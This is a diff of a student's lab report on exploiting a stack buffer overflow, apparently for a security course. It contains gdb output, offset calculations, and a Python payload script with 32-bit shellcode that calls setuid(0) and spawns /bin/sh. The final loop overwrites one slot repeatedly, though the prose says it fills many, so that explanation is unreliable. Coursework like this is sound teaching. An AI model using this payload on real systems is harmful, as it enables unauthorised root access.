@@ -68,10 +68,10 @@ gdb-peda$ p/d 0xffffcb18 - 0xffffcaac
 $3 = 108
 gdb-peda$ quit
 ```
-We have found our ebp address to be 0xffffcb18, our buffer address to be 0xffffcaac, and offset to be 108.
+We have found our ebp address to be 0xffffcb18, our buffer address to be 0xffffcaac, and offset to be 108. Additionally, we can see our buffer size to be 100.
 
 #### Task 2.2:
-First, I added the appropriate shellcode, the 32 bit version from the call_shellcode program. Second, I included the offset and ret values. The variable offset is the difference between the ebp and buffer plus 4 (108 + 4). The offset will be 4 bytes above the current frame pointer; thus, we must adjust it by 4 bytes. The ret will be the ebp address + some delta, with the example being 0x78 during class. However, after a few guess and check, I found that this program was pretty lenient with the value and 120 was one of the few values that I checked that worked. On the other hand, while I was modifying all these inputs, I realized none of my code worked. While I was searching for help, I saw that the code given to us and the example code Travis showed us was different right around variable "start". Therefore, I changed that portion and kept what I modified for offset, ret, and shellcode, which worked just fine. Thus, I have included the whole program this time so it is clear what I modified:
+First, I added the appropriate shellcode, the 32 bit version from the call_shellcode program. Second, I included the offset and ret values. The variable offset is the difference between the ebp and buffer plus 4 (108 + 4). The offset will be 4 bytes above the current frame pointer; thus, we must adjust it by 4 bytes. The ret will be the ebp address + some delta, with the example being 0x78 during class. However, after a few guess and check, I realized that the delta starts at the buffer size and you may increase it by a little bit (I think the cap depends on the version of the program you have). Therefore, I used 120. On the other hand, while I was modifying all these inputs, I realized none of my code worked. While I was searching for help, I saw that the code given to us and the example code Travis showed us was different right around variable "start". Therefore, I changed that portion and kept what I modified for offset, ret, and shellcode, which worked just fine. Thus, I have included the whole program this time so it is clear what I modified:
 ```
 #!/usr/bin/python3
 import sys
@@ -93,7 +93,7 @@ content[start:] = shellcode
 
 # Decide the return address value and put it somewhere in the payload
 offset = 112      # TODO: Change this number
-ret = 0xffffcb18 + 120  # TODO: Change this number
+ret = 0xffffcb18 + 112 + 100  # TODO: Change this number
 
 L = 4           # Use 4 for 32-bit address and 8 for 64-bit address
 content[offset:offset + L] = (ret).to_bytes(L, byteorder='little')
@@ -129,33 +129,34 @@ gdb-peda$ run
 gdb-peda$ next
 ...
 gdb-peda$ p $ebp
-$1 = (void *) 0xffffcb18
+$1 = (void *) 0xffffcb58
 gdb-peda$ p &buffer
-$2 = (char (*)[160]) 0xffffca70
-gdb-peda$ p/d 0xffffcb18 - 0xffffca70
+$2 = (char (*)[160]) 0xffffcab0
+gdb-peda$ p/d 0xffffcb58 - 0xffffcab0
 $3 = 168
-gdb-peda$ quit
 ```
 I used to gdb to get the offset and ebp value that I will be using for my ret. Then I modified my exploit code. First, I changed the shellcode to the appropriate version. Then I changed the start because of the reason I talked about above. Lastly, I modified offset and ret according to gdb information. However, this time, I tried to fill the most of the NOPs with the correct some return address. Since I discovered in my previous tests that the 32-bit version and 100 buffer space is pretty lenient. On top of that, we know that the buffer size is between 100 and 200, so I decided to set a for loop with size 25 that iterate through while adding 4 each time to cover the memory alignment. Also, I included 200 to ensure that it will not cause any error, I found through my experient, at least with 32-bit versions, that if you do not surpass your offset number, you will like get either segmentation error or illegal instruction.  
 ```
 ...
 shellcode = (
+  "\x31\xdb\x31\xc0\xb0\xd5\xcd\x80"
     "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
     "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
     "\xd2\x31\xc0\xb0\x0b\xcd\x80"
 ).encode('latin-1')
+
 ...
 
-start = 517 - len(shellcode)      # TODO: Change this number
-content[start:] = shellcode
-...
+# Decide the return address value and put it somewhere in the payload
+offset = 172      # TODO: Change this number
 
-offset = 112
+  # TODO: Change this number
+delta = 100
 L = 4           # Use 4 for 32-bit address and 8 for 64-bit address
 for i in range(25):
-	ret = 0xffffcb18 + offset + 200
+	ret = 0xffffcb58 + 172 + delta
 	content[offset:offset + L] = (ret).to_bytes(L, byteorder='little')
-	offset = offset + 4
+	delta = delta + 4
 ##################################################################
 ...
 ```
